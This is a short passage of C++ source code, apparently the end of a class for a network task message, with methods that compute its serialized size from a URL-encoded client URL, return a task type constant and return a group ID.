			<< GroupID;
	}
	virtual size_t GetObjectSize() const
	{
		SynacastUrlEncoding& encoding = XDUrlEncoding::Instance();
		return sizeof(UINT16) 
			+ sizeof(UINT16) + encoding.CalcEncodedLength(ClientUrl.size())
			+ sizeof(INT32);
	}
	
	virtual UINT8 GetTaskType() const
	{
		return XD_ClIENTEXSIM_TASK;
	}
	
	virtual INT32 GetGroupID() const
	{
		return GroupID;
	}
};